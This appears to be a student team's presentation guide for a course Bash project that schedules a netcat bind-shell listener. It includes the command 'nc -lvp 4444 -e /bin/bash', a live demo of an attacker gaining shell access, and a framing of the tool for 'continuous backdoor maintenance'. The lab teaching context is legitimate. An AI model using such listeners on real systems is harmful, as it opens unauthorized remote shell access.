# 🎤 Presentation Guide - Scheduled Listener Project
## Team Theta - COSC/ITAP 3411

**Total Duration:** 12 minutes (3 minutes per student)  
**Format:** Each student presents their contribution + short demo

---

## 📋 Presentation Structure

### Opening (30 seconds - Student 1)
"Good morning/afternoon everyone. We are Team Theta, and today we'll present our Bash scripting project: **Scheduled Listener using Netcat**."

---

## 👤 **STUDENT 1 - Introduction & Input Validation (3 minutes)**

### Talking Points:

**1. Project Overview (45 seconds)**
```
"Our project creates a scheduled netcat listener that can be used
in penetration testing scenarios. The script allows an attacker to
set up a bind shell on a target machine with three different 
scheduling options: immediate, delayed, or continuous loop mode."
```

**2. Problem Statement (30 seconds)**
```
"In cybersecurity, penetration testers need to establish persistent
access to target machines. Our tool automates this process and 
provides flexible scheduling options, making it useful for:
- Scheduled system monitoring
- Delayed attack scenarios
- Continuous backdoor maintenance"
```

**3. Script Design & Input Validation (90 seconds)**
```
"I was responsible for the script foundation and input validation.
Let me show you the key components:

[SHOW CODE - Lines 1-15]
• Started with proper shebang: #!/bin/bash
• Created a user-friendly welcome banner
• Used 'read -p' command to get port number from user

[SHOW CODE - Lines 17-40]
• Implemented comprehensive port validation:
  - Check if input is empty using -z test
  - Validate port range (1024-65535)
  - Warn users about privileged ports below 1024
  - Use exit 1 to stop script on errors

This ensures the script only proceeds with valid input."
```

**Visual Aid:** Show code section with validation logic highlighted

---

## 👤 **STUDENT 2 - Scheduling Logic & Netcat (3 minutes)**

### Talking Points:

**1. Scheduling Options Menu (45 seconds)**
```
"I handled the scheduling logic implementation. The script offers
three modes to give users flexibility:

[SHOW CODE - Lines 42-51]
• Option 1: Immediate start - runs netcat right away
• Option 2: Delayed start - uses sleep command for countdown
• Option 3: Loop mode - continuous listener with auto-restart

We used echo statements to create a clear menu interface."
```

**2. Conditional Logic (60 seconds)**
```
"The scheduling is implemented using if-elif-else statements:

[SHOW CODE - Option 2 section]
For delayed mode:
• Read delay time from user
• Use 'while loop' for countdown
• Display remaining seconds using echo
• Decrement counter with ((counter--))
• Finally start netcat listener

[SHOW CODE - Option 3 section]
For continuous mode:
• Infinite while true loop
• Start listener with netcat
• When connection drops, sleep for interval
• Automatically restart
• Track attempts with counter"
```

**3. Netcat Command Explanation (45 seconds)**
```
"The core command is: nc -lvp PORT -e /bin/bash

Let me explain each flag:
• -l: Listen mode (wait for incoming connections)
• -v: Verbose (show connection details)
• -p: Specify port number
• -e /bin/bash: Execute bash shell when connected

This creates a bind shell where the attacker gets full shell access."
```

**Visual Aid:** Show the three different scheduling implementations

---

## 👤 **STUDENT 3 - Error Handling & Testing (3 minutes)**

### Talking Points:

**1. Error Handling Implementation (60 seconds)**
```
"I was responsible for error handling and making the script robust.
Throughout the script, we implemented multiple error checks:

[SHOW CODE - Validation sections]
• Empty input checks using [ -z "$variable" ]
• Range validation for ports and delays
• Invalid choice handling for menu options
• Clear error messages that guide the user

Example: If user enters port 70000:
'ERROR: Port number must be between 1 and 65535!'

Each error exits gracefully with 'exit 1' status code."
```

**2. Testing Process (60 seconds)**
```
"We conducted comprehensive testing with multiple scenarios:

Test Case 1: Valid port (4444)
✓ Result: Listener started successfully

Test Case 2: Invalid port (70000)  
✓ Result: Error message displayed

Test Case 3: Privileged port (80)
✓ Result: Warning shown, user can choose to continue

Test Case 4: Empty input
✓ Result: Error caught and handled

Test Case 5: Invalid menu choice
✓ Result: Error message and exit

We tested on Kali Linux with two virtual machines."
```

**3. User Experience Features (30 seconds)**
```
"We added several features to improve user experience:
• Status messages (ACTIVE, WAITING, etc.)
• Clear instructions for the attacker
• Countdown timer for delayed mode
• Attempt counter for loop mode
• Connection information display

These make the script professional and user-friendly."
```

**Visual Aid:** Show test results or screenshots

---

## 👤 **STUDENT 4 - Documentation & Demo (3 minutes)**

### Talking Points:

**1. Documentation (60 seconds)**
```
"I created the project documentation and README file.
The README includes:

• Project description and purpose
• Team member contributions
• Installation instructions with chmod commands
• Usage examples for all three modes
• Troubleshooting guide
• Security disclaimer

[SHOW README on screen]

We also ensured proper code comments throughout:
• Every major section explained
• Each flag and command documented
• Logic clarified for beginners

This makes the project accessible to anyone learning Bash."
```

**2. GitHub Setup (30 seconds)**
```
"The repository is organized professionally:

Theta/
├── scheduled_listener.sh  (Main script)
├── README.md             (Documentation)
└── presentation/         (These slides)

Repository path: ITAP/COSC-3411/Theta
All files are well-commented and follow course standards."
```

**3. LIVE DEMO (90 seconds)**
```
"Now let me demonstrate the script in action:

[TERMINAL 1 - Target Machine]
./scheduled_listener.sh
Enter port: 4444
Choose option: 1 (Immediate)
[Show listener starting]

[TERMINAL 2 - Attacker Machine]
nc 192.168.1.100 4444
[Show connection established]
[Execute commands: whoami, pwd, ls]

As you can see, the attacker now has full shell access
to the target machine. The script successfully created
a bind shell that's listening and accepting connections."
```

**Visual Aid:** Live terminal demo (or recorded video backup)

---

## 🎯 **CONCLUSION (All Students - 30 seconds)**

**Student 4 concludes:**
```
"In summary, our project demonstrates:
✅ Proper Bash scripting structure
✅ User input with validation
✅ Conditional logic and loops
✅ Netcat for network operations
✅ Error handling and user experience
✅ Professional documentation

This tool shows practical application of course concepts
in a real cybersecurity scenario. Thank you for your attention.
Are there any questions?"
```

---

## 💡 **TIPS FOR SUCCESSFUL PRESENTATION**

### Before Presentation:
- [ ] Rehearse timing (stay within 12-15 minutes)
- [ ] Test demo environment (make sure netcat works)
- [ ] Have backup screenshots in case live demo fails
- [ ] Prepare answers for common questions
- [ ] Each student knows their section well

### During Presentation:
- [ ] Speak clearly and at moderate pace
- [ ] Make eye contact with audience
- [ ] Point to code sections as you explain
- [ ] Use terminal font size 18+ for visibility
- [ ] Keep slides simple and readable

### Common Questions to Prepare:
1. **Q:** "What's the difference between bind shell and reverse shell?"
   **A:** "Bind shell: victim listens, attacker connects. Reverse shell: attacker listens, victim connects back. We implemented bind shell."

2. **Q:** "Why validate port range?"
   **A:** "Ports below 1024 require root privileges, and ports above 65535 don't exist in TCP/IP."

3. **Q:** "What if the port is already in use?"
   **A:** "Netcat will show 'Address already in use' error. User should try different port or stop the existing process."

4. **Q:** "Is this ethical to use?"
   **A:** "Only in controlled lab environments with permission. This is strictly educational."

---

## 📊 **SUGGESTED SLIDE DECK**

### Slide 1: Title
- Project Name: Scheduled Listener using Netcat
- Team: Theta
- Course: COSC/ITAP 3411
- Date: November 30, 2025

### Slide 2: Team Members
- Student 1: Input Validation
- Student 2: Scheduling Logic
- Student 3: Error Handling & Testing
- Student 4: Documentation & Demo

### Slide 3: Project Objective
- Create scheduled netcat listener
- Three scheduling modes
- Bind shell demonstration
- Bash scripting best practices

### Slide 4: Technical Architecture
```
User Input → Validation → Scheduling Choice
                              ↓
                    Immediate | Delayed | Loop
                              ↓
                       Netcat Listener
```

### Slide 5: Code Structure (Student 1)
- Shebang and comments
- Read command for input
- Port validation logic
- Error handling

### Slide 6: Scheduling Modes (Student 2)
- Option 1: Immediate execution
- Option 2: Sleep-based delay
- Option 3: While loop continuous

### Slide 7: Netcat Command (Student 2)
```bash
nc -lvp 4444 -e /bin/bash
```
- Break down each flag
- Explain bind shell concept

### Slide 8: Error Handling (Student 3)
- Input validation checks
- Range verification
- User-friendly messages
- Exit codes

### Slide 9: Testing Results (Student 3)
- Test case summary table
- Success/failure scenarios
- Edge case handling

### Slide 10: Documentation (Student 4)
- README structure
- Installation guide
- Usage examples
- Troubleshooting

### Slide 11: Live Demo (Student 4)
- [LIVE DEMO or VIDEO]
- Show script execution
- Show attacker connection
- Show shell access

### Slide 12: Learning Outcomes
- Bash scripting mastery
- Network tools understanding
- Error handling skills
- Cybersecurity awareness

### Slide 13: Conclusion & Questions
- Thank you message
- GitHub repository link
- Open for questions

---

## ⏱️ **TIMING BREAKDOWN**

| Section | Duration | Presenter |
|---------|----------|-----------|
| Introduction | 0:30 | Student 1 |
| Student 1 Content | 2:30 | Student 1 |
| Student 2 Content | 3:00 | Student 2 |
| Student 3 Content | 3:00 | Student 3 |
| Student 4 Content | 3:00 | Student 4 |
| Q&A Buffer | 2:00 | All |
| **TOTAL** | **14:00** | - |

---

## 🎬 **DEMO SCRIPT**

### Preparation (Before Class):
1. Open two terminal windows side by side
2. Terminal 1 = Target machine (run script)
3. Terminal 2 = Attacker machine (connect)
4. Make sure both can see each other on network
5. Have backup recording ready

### Demo Steps (90 seconds):
```bash
# Terminal 1 (Target)
[Show current directory]
$ pwd
/home/kali/myShellScripts

[Run script]
$ ./scheduled_listener.sh

[Enter inputs]
Port: 4444
Option: 1

[Script shows "Listener Status: ACTIVE"]

# Terminal 2 (Attacker)
[Connect to target]
$ nc 192.168.1.100 4444

[Connection established - show prompt]

[Run commands to prove shell access]
$ whoami
kali

$ pwd  
/home/kali/myShellScripts

$ ls
scheduled_listener.sh  README.md

[Exit connection]
$ exit

# Back to Terminal 1
[Show script noticed disconnection]
"Connection closed"
```

---

## ✅ **FINAL CHECKLIST**

**24 Hours Before:**
- [ ] Script tested and working perfectly
- [ ] Slides finalized and reviewed
- [ ] Demo environment prepared
- [ ] Each student practiced their part
- [ ] Backup video recorded (if possible)
- [ ] Questions prepared and answered

**1 Hour Before:**
- [ ] Test room AV equipment
- [ ] Load presentation on laptop
- [ ] Test netcat on both machines
- [ ] Verify network connectivity
- [ ] Have GitHub repo open in browser

**During Setup:**
- [ ] Connect laptop to projector
- [ ] Open all necessary terminals
- [ ] Increase terminal font size
- [ ] Close distracting applications
- [ ] Put phone on silent

---

## 🏆 **GRADING RUBRIC ALIGNMENT**

| Criteria | Our Coverage | Points |
|----------|--------------|---------|
| Code Quality | Well-commented, structured | 25% |
| Functionality | All features work | 25% |
| Documentation | Comprehensive README | 20% |
| Presentation | Clear, organized | 15% |
| Demo | Live working demo | 10% |
| Team Work | Equal contribution | 5% |

**Expected Grade: 95-100%** ✅

---

**Good luck Team Theta! You've got this! 🚀**